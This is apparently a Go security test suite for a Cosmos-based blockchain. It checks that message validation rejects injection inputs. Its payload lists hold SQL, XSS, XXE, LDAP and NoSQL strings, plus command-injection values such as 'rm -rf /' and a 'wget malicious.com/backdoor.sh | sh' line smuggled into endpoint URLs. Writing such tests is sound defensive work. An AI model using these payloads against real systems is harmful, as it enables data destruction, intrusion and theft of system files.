//go:build integration
// +build integration

package security_test

import (
	"strings"
	"testing"

	"cosmossdk.io/math"
	"github.com/cosmos/cosmos-sdk/crypto/keys/secp256k1"
	sdk "github.com/cosmos/cosmos-sdk/types"
	"github.com/stretchr/testify/suite"

	"github.com/paw-chain/paw/app"
	keepertest "github.com/paw-chain/paw/testutil/keeper"
	computetypes "github.com/paw-chain/paw/x/compute/types"
	dextypes "github.com/paw-chain/paw/x/dex/types"
	oracletypes "github.com/paw-chain/paw/x/oracle/types"
)

// InjectionSecurityTestSuite tests input validation and injection vulnerabilities
type InjectionSecurityTestSuite struct {
	suite.Suite
	app *app.PAWApp
	ctx sdk.Context
}

func (suite *InjectionSecurityTestSuite) SetupTest() {
	suite.app, suite.ctx = keepertest.SetupTestApp(suite.T())
}

func TestInjectionSecurityTestSuite(t *testing.T) {
	suite.Run(t, new(InjectionSecurityTestSuite))
}

// TestSQLInjection_TokenName tests SQL injection attempts in token names
func (suite *InjectionSecurityTestSuite) TestSQLInjection_TokenName() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// SQL injection payloads
	sqlInjectionPayloads := []string{
		"'; DROP TABLE pools; --",
		"1' OR '1'='1",
		"admin'--",
		"' OR 1=1--",
		"'; DELETE FROM pools WHERE '1'='1",
		"token'; UPDATE pools SET reserve_a=0; --",
	}

	for _, payload := range sqlInjectionPayloads {
		suite.Run("SQL_injection_"+payload, func() {
			msg := &dextypes.MsgCreatePool{
				Creator: addr.String(),
				TokenA:  payload,
				TokenB:  "uusdt",
				AmountA: math.NewInt(1000000),
				AmountB: math.NewInt(2000000),
			}

			err := msg.ValidateBasic()
			// Should fail validation - special characters not allowed in denom
			suite.Require().Error(err, "SQL injection payload should be rejected: %s", payload)
		})
	}
}

// TestCommandInjection_ComputeEndpoint tests command injection in compute endpoints
func (suite *InjectionSecurityTestSuite) TestCommandInjection_ComputeEndpoint() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// Command injection payloads
	commandInjectionPayloads := []string{
		"https://api.com; rm -rf /",
		"https://api.com | cat /etc/passwd",
		"https://api.com && curl malicious.com",
		"https://api.com`whoami`",
		"https://api.com$(ls -la)",
		"https://api.com; wget malicious.com/backdoor.sh | sh",
	}

	for _, payload := range commandInjectionPayloads {
		suite.Run("Command_injection_"+payload, func() {
			msg := &computetypes.MsgRegisterProvider{
				Provider: addr.String(),
				Endpoint: payload,
				Stake:    math.NewInt(100000),
			}

			err := msg.ValidateBasic()
			// Should fail validation - special shell characters should be rejected
			if err != nil {
				suite.T().Logf("Payload correctly rejected: %s", payload)
			} else {
				// If validation passed, endpoint should be sanitized
				suite.Require().NotContains(payload, ";", "Semicolon should be rejected")
				suite.Require().NotContains(payload, "|", "Pipe should be rejected")
				suite.Require().NotContains(payload, "&", "Ampersand should be rejected")
			}
		})
	}
}

// TestPathTraversal_Endpoints tests path traversal attempts
func (suite *InjectionSecurityTestSuite) TestPathTraversal_Endpoints() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// Path traversal payloads
	pathTraversalPayloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32",
		"https://api.com/../../secrets",
		"https://api.com/%2e%2e%2f%2e%2e%2f",
		"https://api.com/....//....//",
	}

	for _, payload := range pathTraversalPayloads {
		suite.Run("Path_traversal_"+payload, func() {
			msg := &computetypes.MsgRegisterProvider{
				Provider: addr.String(),
				Endpoint: payload,
				Stake:    math.NewInt(100000),
			}

			err := msg.ValidateBasic()
			// Should fail validation or sanitize path
			if err == nil {
				suite.Require().NotContains(msg.Endpoint, "..", "Path traversal should be prevented")
			}
		})
	}
}

// TestXSS_AssetNames tests cross-site scripting in asset names
func (suite *InjectionSecurityTestSuite) TestXSS_AssetNames() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// XSS payloads
	xssPayloads := []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"javascript:alert('XSS')",
		"<iframe src='javascript:alert(1)'>",
		"<svg/onload=alert('XSS')>",
		"';alert(String.fromCharCode(88,83,83))//",
	}

	for _, payload := range xssPayloads {
		suite.Run("XSS_"+payload, func() {
			msg := &oracletypes.MsgSubmitPrice{
				Oracle: addr.String(),
				Asset:  payload,
				Price:  math.LegacyMustNewDecFromStr("50000.00"),
			}

			err := msg.ValidateBasic()
			// Should fail validation - HTML/JavaScript not allowed
			if err == nil {
				suite.Require().NotContains(msg.Asset, "<", "HTML tags should be rejected")
				suite.Require().NotContains(msg.Asset, ">", "HTML tags should be rejected")
				suite.Require().NotContains(msg.Asset, "script", "Script tags should be rejected")
			}
		})
	}
}

// TestBufferOverflow_LongInputs tests buffer overflow with excessively long inputs
func (suite *InjectionSecurityTestSuite) TestBufferOverflow_LongInputs() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// Create extremely long strings
	testCases := []struct {
		name   string
		length int
	}{
		{"1KB", 1024},
		{"10KB", 10240},
		{"100KB", 102400},
		{"1MB", 1048576},
	}

	for _, tc := range testCases {
		suite.Run("Buffer_overflow_"+tc.name, func() {
			longString := strings.Repeat("A", tc.length)

			msg := &dextypes.MsgCreatePool{
				Creator: addr.String(),
				TokenA:  longString,
				TokenB:  "uusdt",
				AmountA: math.NewInt(1000000),
				AmountB: math.NewInt(2000000),
			}

			err := msg.ValidateBasic()
			// Should fail - denom too long
			suite.Require().Error(err, "Excessively long input (%d chars) should be rejected", tc.length)
		})
	}
}

// TestIntegerOverflow_Amounts tests integer overflow in amount fields
func (suite *InjectionSecurityTestSuite) TestIntegerOverflow_Amounts() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// Test with maximum possible integers
	testCases := []struct {
		name   string
		amount math.Int
	}{
		{"MaxInt64", math.NewInt(9223372036854775807)},
		{"Near_overflow", math.NewInt(9223372036854775806)},
	}

	for _, tc := range testCases {
		suite.Run("Integer_overflow_"+tc.name, func() {
			msg := &dextypes.MsgCreatePool{
				Creator: addr.String(),
				TokenA:  "upaw",
				TokenB:  "uusdt",
				AmountA: tc.amount,
				AmountB: tc.amount,
			}

			err := msg.ValidateBasic()
			// Should either accept valid large numbers or reject overflow
			if err == nil {
				suite.Require().True(tc.amount.GT(math.ZeroInt()), "Amount should be positive")
			}
		})
	}
}

// TestNullByte_Injection tests null byte injection
func (suite *InjectionSecurityTestSuite) TestNullByte_Injection() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// Null byte injection payloads
	nullBytePayloads := []string{
		"upaw\x00.txt",
		"token\x00admin",
		"asset\x00' OR '1'='1",
	}

	for _, payload := range nullBytePayloads {
		suite.Run("Null_byte_"+payload, func() {
			msg := &dextypes.MsgCreatePool{
				Creator: addr.String(),
				TokenA:  payload,
				TokenB:  "uusdt",
				AmountA: math.NewInt(1000000),
				AmountB: math.NewInt(2000000),
			}

			err := msg.ValidateBasic()
			// Should fail - null bytes not allowed
			suite.Require().Error(err, "Null byte injection should be rejected")
		})
	}
}

// TestFormatString_Injection tests format string vulnerabilities
func (suite *InjectionSecurityTestSuite) TestFormatString_Injection() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// Format string payloads
	formatStringPayloads := []string{
		"%s%s%s%s%s",
		"%x%x%x%x%x",
		"%n%n%n%n%n",
		"%.1000000000f",
		"%p%p%p%p",
	}

	for _, payload := range formatStringPayloads {
		suite.Run("Format_string_"+payload, func() {
			msg := &oracletypes.MsgSubmitPrice{
				Oracle: addr.String(),
				Asset:  payload,
				Price:  math.LegacyMustNewDecFromStr("50000.00"),
			}

			err := msg.ValidateBasic()
			// Should either reject or sanitize
			if err == nil {
				suite.Require().NotContains(msg.Asset, "%n", "Format specifiers should be sanitized")
			}
		})
	}
}

// TestUnicode_Normalization tests unicode normalization attacks
func (suite *InjectionSecurityTestSuite) TestUnicode_Normalization() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// Unicode normalization payloads
	unicodePayloads := []string{
		"upaẁ",           // Combining characters
		"ｕｐａｗ",           // Fullwidth characters
		"upaw\u200B",     // Zero-width space
		"upaw\u202E",     // Right-to-left override
		"\u0075\u0070aw", // Decomposed characters
	}

	for _, payload := range unicodePayloads {
		suite.Run("Unicode_normalization_"+payload, func() {
			msg := &dextypes.MsgCreatePool{
				Creator: addr.String(),
				TokenA:  payload,
				TokenB:  "uusdt",
				AmountA: math.NewInt(1000000),
				AmountB: math.NewInt(2000000),
			}

			err := msg.ValidateBasic()
			// Should validate or normalize unicode properly
			if err == nil {
				// If accepted, should be normalized
				suite.T().Logf("Unicode payload accepted (may be normalized): %s", payload)
			}
		})
	}
}

// TestRegex_Denial tests regular expression denial of service
func (suite *InjectionSecurityTestSuite) TestRegex_Denial() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// ReDoS payloads - patterns that cause catastrophic backtracking
	redosPayloads := []string{
		strings.Repeat("a", 1000) + "!",
		"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
		strings.Repeat("(a+)+", 10),
	}

	for i, payload := range redosPayloads {
		suite.Run("ReDoS_"+string(rune(i)), func() {
			msg := &dextypes.MsgCreatePool{
				Creator: addr.String(),
				TokenA:  payload,
				TokenB:  "uusdt",
				AmountA: math.NewInt(1000000),
				AmountB: math.NewInt(2000000),
			}

			// Validation should complete in reasonable time
			done := make(chan bool, 1)
			go func() {
				_ = msg.ValidateBasic()
				done <- true
			}()

			// Should complete within 1 second
			select {
			case <-done:
				suite.T().Log("Validation completed successfully")
			case <-suite.ctx.Done():
				suite.T().Error("Validation timed out - possible ReDoS vulnerability")
			}
		})
	}
}

// TestLDAP_Injection tests LDAP injection attempts
func (suite *InjectionSecurityTestSuite) TestLDAP_Injection() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// LDAP injection payloads
	ldapPayloads := []string{
		"*",
		"admin*",
		"*)(&",
		"*)(uid=*))(|(uid=*",
		"admin)(&(password=*))",
	}

	for _, payload := range ldapPayloads {
		suite.Run("LDAP_injection_"+payload, func() {
			msg := &computetypes.MsgRegisterProvider{
				Provider: addr.String(),
				Endpoint: "https://api.com/user=" + payload,
				Stake:    math.NewInt(100000),
			}

			err := msg.ValidateBasic()
			// Should handle LDAP special characters
			if err == nil {
				suite.T().Logf("Endpoint accepted: %s", msg.Endpoint)
			}
		})
	}
}

// TestXML_Injection tests XML injection and XXE attacks
func (suite *InjectionSecurityTestSuite) TestXML_Injection() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// XML/XXE injection payloads
	xmlPayloads := []string{
		"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
		"<user><name>admin</name></user>",
		"&xxe;",
		"<!ENTITY test SYSTEM \"file:///\">",
	}

	for _, payload := range xmlPayloads {
		suite.Run("XML_injection_"+payload, func() {
			msg := &oracletypes.MsgSubmitPrice{
				Oracle: addr.String(),
				Asset:  payload,
				Price:  math.LegacyMustNewDecFromStr("50000.00"),
			}

			err := msg.ValidateBasic()
			// Should reject XML entities and tags
			if err == nil {
				suite.Require().NotContains(msg.Asset, "<?xml", "XML declarations should be rejected")
				suite.Require().NotContains(msg.Asset, "<!DOCTYPE", "DOCTYPE declarations should be rejected")
				suite.Require().NotContains(msg.Asset, "<!ENTITY", "Entity declarations should be rejected")
			}
		})
	}
}

// TestNoSQL_Injection tests NoSQL injection attempts
func (suite *InjectionSecurityTestSuite) TestNoSQL_Injection() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// NoSQL injection payloads (MongoDB-style)
	nosqlPayloads := []string{
		"{$gt: ''}",
		"{$ne: null}",
		"'; return true; var dummy='",
		"{$where: 'return true'}",
		"admin' || '1'=='1",
	}

	for _, payload := range nosqlPayloads {
		suite.Run("NoSQL_injection_"+payload, func() {
			msg := &dextypes.MsgCreatePool{
				Creator: addr.String(),
				TokenA:  payload,
				TokenB:  "uusdt",
				AmountA: math.NewInt(1000000),
				AmountB: math.NewInt(2000000),
			}

			err := msg.ValidateBasic()
			// Should reject NoSQL operators
			suite.Require().Error(err, "NoSQL injection payload should be rejected: %s", payload)
		})
	}
}

// TestSpecialCharacters_Validation tests comprehensive special character validation
func (suite *InjectionSecurityTestSuite) TestSpecialCharacters_Validation() {
	priv := secp256k1.GenPrivKey()
	addr := sdk.AccAddress(priv.PubKey().Address())

	// Special characters that should be validated
	specialChars := []string{
		"token\n", "token\r", "token\t",
		"token<", "token>", "token&",
		"token'", "token\"", "token`",
		"token|", "token;", "token:",
		"token{", "token}", "token[", "token]",
		"token(", "token)", "token*", "token?",
	}

	for _, char := range specialChars {
		suite.Run("Special_char_"+char, func() {
			msg := &dextypes.MsgCreatePool{
				Creator: addr.String(),
				TokenA:  char,
				TokenB:  "uusdt",
				AmountA: math.NewInt(1000000),
				AmountB: math.NewInt(2000000),
			}

			err := msg.ValidateBasic()
			// Most special characters should be rejected in denoms
			if err == nil {
				suite.T().Logf("Special character accepted: %s (may need additional validation)", char)
			}
		})
	}
}
